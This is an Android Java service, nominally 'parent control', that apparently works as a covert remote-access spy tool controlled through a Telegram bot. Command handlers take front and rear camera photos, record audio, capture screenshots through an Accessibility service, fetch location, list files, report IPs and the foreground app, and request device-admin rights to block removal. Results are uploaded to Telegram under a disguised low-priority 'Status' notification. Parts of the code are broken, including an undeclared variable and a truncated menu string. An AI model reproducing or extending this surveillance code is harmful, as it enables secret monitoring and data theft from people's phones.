package com.parentcontrol;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import java.net.NetworkInterface;
import java.util.Collections;
import android.os.BatteryManager;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BotService extends Service {

    private static final String CHANNEL_ID = "status_service";
    private static BotService instance;

    public static BotService getInstance() { return instance; }
    public ExecutorService getWorkers() { return workers; }
    private long lastUpdateId = 0;
    private boolean running = false;
    private ExecutorService executor;   // для pollLoop
    private ExecutorService workers;    // для камеры/аудио/файлов
    private OkHttpClient client;      // для long polling
    private OkHttpClient sender;      // для отправки сообщений

    private String waitingFor = null;
    private String waitingChatId = null;
    private String lastKnownChatId = null; // для отладки

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences prefs = getSharedPreferences("prefs", MODE_PRIVATE);
        savedPassword = prefs.getString("admin_password", null);

        client = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
        sender = new OkHttpClient.Builder()
            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .build();

        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Status")
            .setContentText("Работает в фоне")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
        startForeground(1, notification);

        running = true;
        executor = Executors.newSingleThreadExecutor(); // только для pollLoop
        workers = Executors.newFixedThreadPool(4);    // для задач
        executor.execute(this::pollLoop);
        AppLogger.log("✅ Сервис запущен, начинаю polling");
        instance = this;
        StatusAccessibilityService.setBotService(this);
        // Если AccessibilityService уже запущен - связываем
        if (StatusAccessibilityService.getInstance() != null) {
            AppLogger.log("✅ AccessibilityService уже активен");
        } else {
            AppLogger.log("⚠️ AccessibilityService не активен - включи в настройках");
        }

        return START_STICKY;
    }

    private void pollLoop() {
        int iteration = 0;
        while (running) {
            iteration++;
            try {
                AppLogger.log("🔄 Poll #" + iteration + " offset=" + (lastUpdateId + 1));
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN +
                    "/getUpdates?timeout=5&offset=" + (lastUpdateId + 1);
                Request request = new Request.Builder().url(url).build();
                Response response = client.newCall(request).execute();
                String body = response.body().string();
                response.close();
                AppLogger.log("📡 Poll #" + iteration + " ответ получен len=" + body.length());

                JSONObject json = new JSONObject(body);
                if (!json.getBoolean("ok")) continue;

                JSONArray updates = json.getJSONArray("result");
                if (updates.length() > 0) AppLogger.log("📥 Получено updates: " + updates.length());
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");

                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String fromId = message.getJSONObject("chat").getString("id");
                        lastKnownChatId = fromId;
                        if (message.has("text")) {
                            AppLogger.log("💬 Сообщение от: " + fromId + " -> " + message.getString("text"));
                            handleMessage(message.getString("text"), fromId);
                        }
                    }
                }
            } catch (Exception e) {
                // Логируем ошибку в бот чтобы видеть что происходит
                try {
                    sendTextTo_direct("DEBUG pollLoop error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
                } catch (Exception ignored) {}
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void handleMessage(String text, String fromChatId) {
        String cmd = text.trim().toLowerCase();
        // Убираем @username если есть (например /ip@botname)
        if (cmd.contains("@")) cmd = cmd.substring(0, cmd.indexOf("@"));

        // Ожидание ввода от пользователя
        if (waitingFor != null && fromChatId.equals(waitingChatId)) {
            switch (waitingFor) {
                case "record_seconds":
                    try {
                        int seconds = Integer.parseInt(text.trim());
                        if (seconds < 1 || seconds > 3600) {
                            sendTextTo(fromChatId, "⚠️ Введи число от 1 до 3600");
                        } else {
                            waitingFor = null;
                            waitingChatId = null;
                            sendTextTo(fromChatId, "🎤 Начинаю запись на " + seconds + " сек...");
                            final String cid = fromChatId;
                            workers.execute(() -> AudioHelper.record(this, client, cid, seconds));
                        }
                    } catch (NumberFormatException e) {
                        sendTextTo(fromChatId, "⚠️ Введи число (например: 30)");
                    }
                    return;

            }
        }

        // Команды
        switch (cmd) {
            case "/start":
            case "/menu":
                sendMenuInfo(fromChatId);
                break;
            case "/ip":
                sendIp(fromChatId);
                break;
            case "/status":
                sendStatus(fromChatId);
                break;
            case "/files":
                workers.execute(() -> FileHelper.listFiles(this, client, fromChatId));
                break;
            case "/location":
                sendTextTo(fromChatId, "📍 Получаю местоположение...");
                workers.execute(() -> LocationHelper.getLocation(this, client, fromChatId));
                break;
            case "/camera":
                sendTextTo(fromChatId, "📷 Снимаю фото...");
                workers.execute(() -> CameraHelper.takePhoto(this, client, fromChatId));
                break;
            case "/screenshot":
                doScreenshot(fromChatId);
                break;
            case "/selfie":
                sendTextTo(fromChatId, "🤳 Снимаю фронталку...");
                workers.execute(() -> CameraHelper.takeFrontPhoto(this, client, fromChatId));
                break;
            case "/record":
                waitingFor = "record_seconds";
                waitingChatId = fromChatId;
                sendTextTo(fromChatId, "🎤 Введи количество секунд (например: 30):");
                break;
            case "/apps":
                sendApps(fromChatId);
                break;
            default:
                sendMenuInfo(fromChatId);
                break;
        }
    }



    private void lockScreen(String chatId) {
        if (savedPassword == null) {
            waitingFor = "lock_password";
            waitingChatId = chatId;
            sendTextTo(chatId, "🔒 Придумай пароль для разблокировки (мин. 4 символа):");
            return;
        }
        ScreenBlockManager.setBlocked(true);
        Intent intent = new Intent(this, ScreenBlockActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
        sendTextTo(chatId, "🔒 Экран заблокирован");
    }

    private void unlockScreen(String chatId) {
        ScreenBlockManager.setBlocked(false);
        sendBroadcast(new Intent("com.parentcontrol.UNLOCK"));
        sendTextTo(chatId, "🔓 Экран разблокирован");
    }

        private void sendMenuInfo(String chatId) {
        String msg = "Список команд:\n\n" +
            "/ip - IP адрес\n" +
            "/status - Батарея\n" +
            "/files - Файлы\n" +
            "/location - Местоположение\n" +
            "/camera - Камера\n" +
            "/screenshot - Скриншот экрана\n" +
            "/selfie - Фронтальная камера\n" +
            "/record - Запись аудио\n" +
        sendTextTo(chatId, msg);
    }

    private void sendIp(String chatId) {
        workers.execute(() -> {
            try {
                // Внешний IP
                Request req = new Request.Builder()
                    .url("https://api.ipify.org")
                    .build();
                Response resp = sender.newCall(req).execute();
                String externalIp = resp.body().string().trim();
                resp.close();

                // Локальный IP
                StringBuilder localIps = new StringBuilder();
                java.util.Enumeration<java.net.NetworkInterface> ifaces = java.net.NetworkInterface.getNetworkInterfaces();
                if (ifaces != null) {
                    while (ifaces.hasMoreElements()) {
                        java.net.NetworkInterface iface = ifaces.nextElement();
                        java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
                        while (addrs.hasMoreElements()) {
                            java.net.InetAddress addr = addrs.nextElement();
                            if (!addr.isLoopbackAddress() && (addr instanceof java.net.Inet4Address)) {
                                localIps.append(iface.getName()).append(": ").append(addr.getHostAddress()).append("\n");
                            }
                        }
                    }
                }

                String msg = "IP (внешний): " + externalIp + "\nIP (локальные):\n" + localIps.toString().trim();
                sendPlainText(chatId, msg);
            } catch (Exception e) {
                sendPlainText(chatId, "Ошибка IP: " + e.getMessage());
            }
        });
    }

    private void sendStatus(String chatId) {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            boolean charging = bm.isCharging();
            sendTextTo(chatId, "🔋 Заряд: " + battery + "%\nЗарядка: " + (charging ? "✅" : "❌"));
        } catch (Exception e) {
            sendTextTo(chatId, "❌ Ошибка статуса: " + e.getMessage());
        }
    }

    private void enableDeviceAdmin(String chatId) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (!dpm.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Защита от удаления");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                sendTextTo(chatId, "📲 Открыт экран активации. Нажми 'Активировать' на телефоне.");
            } else {
                sendTextTo(chatId, "🔒 Защита активна.");
            }
        } catch (Exception e) {
            sendTextTo(chatId, "❌ Ошибка: " + e.getMessage());
        }
    }

    private void disableDeviceAdmin(String chatId) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            dpm.removeActiveAdmin(adminComponent);
            savedPassword = null;
            getSharedPreferences("prefs", MODE_PRIVATE).edit().remove("admin_password").apply();
            sendTextTo(chatId, "🔓 Защита снята.");
        } catch (Exception e) {
            sendTextTo(chatId, "❌ Ошибка: " + e.getMessage());
        }
    }

    private void sendTextTo_direct(String text) {
        if (lastKnownChatId != null) sendTextTo(lastKnownChatId, text);
    }

    public void sendPlainText(String chatId, String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", text);
            sendJson("sendMessage", body);
        } catch (Exception ignored) {}
    }

    public void sendTextTo(String chatId, String text) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", text);
            body.put("parse_mode", "Markdown");
            sendJson("sendMessage", body);
        } catch (Exception ignored) {}
    }

    public void sendJson(String method, JSONObject body) {
        try {
            RequestBody requestBody = RequestBody.create(
                body.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/" + method)
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            AppLogger.log("📤 " + method + " -> HTTP " + response.code());
            response.close();
        } catch (Exception e) {
            AppLogger.log("❌ sendJson " + method + ": " + e.getMessage());
        }
    }

    public void sendFile(File file, String caption, String chatId) {
        try {
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.getName(),
                    RequestBody.create(file, MediaType.parse("application/octet-stream")))
                .build();
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendDocument")
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            response.close();
        } catch (Exception e) {
            sendTextTo(chatId, "❌ Ошибка отправки файла: " + e.getMessage());
        }
    }

    public void sendPhoto(File file, String chatId) {
        sendPhotoBytes(file, chatId);
    }

    public void sendPhotoBytes(File file, String chatId) {
        try {
            if (file == null) {
                sendTextTo(chatId, "Ошибка: file null");
                return;
            }
            AppLogger.log("sendPhoto: " + file.getAbsolutePath() + " exists=" + file.exists() + " size=" + file.length());

            // Читаем файл в байты
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            fis.close();

            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("photo", "photo.png",
                    RequestBody.create(bytes, MediaType.parse("image/png")))
                .build();
            Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendPhoto")
                .post(requestBody)
                .build();
            Response response = sender.newCall(request).execute();
            String respBody = response.body().string();
            AppLogger.log("sendPhoto -> HTTP " + response.code() + " " + respBody.substring(0, Math.min(100, respBody.length())));
            response.close();
        } catch (Exception e) {
            AppLogger.log("sendPhoto error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            sendTextTo(chatId, "Ошибка отправки фото: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID, "Status", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
    }

    private void doScreenshot(String chatId) {
        StatusAccessibilityService svc = StatusAccessibilityService.getInstance();
        AppLogger.log("Screenshot: svc=" + (svc != null ? "OK" : "NULL"));
        if (svc == null) {
            sendTextTo(chatId, "Спец. возможности не активны.\nВыключи и снова включи Status в Настройки -> Спец. возможности");
            return;
        }
        sendTextTo(chatId, "📸 Делаю скриншот...");
        svc.takeScreenshot(chatId);
    }



    private void sendApps(String chatId) {
        StatusAccessibilityService acc = StatusAccessibilityService.getInstance();
        if (acc != null) {
            String pkg = acc.getActiveApp();
            try {
                android.content.pm.ApplicationInfo appInfo = getPackageManager()
                    .getApplicationInfo(pkg, 0);
                String label = getPackageManager().getApplicationLabel(appInfo).toString();
                sendPlainText(chatId, "Сейчас открыто: " + label + "\n(" + pkg + ")");
            } catch (Exception e) {
                sendPlainText(chatId, "Сейчас открыто: " + pkg);
            }
        } else {
            sendTextTo(chatId, "Спец. возможности не включены");
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        instance = null;
        if (executor != null) executor.shutdownNow();
        if (workers != null) workers.shutdownNow();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
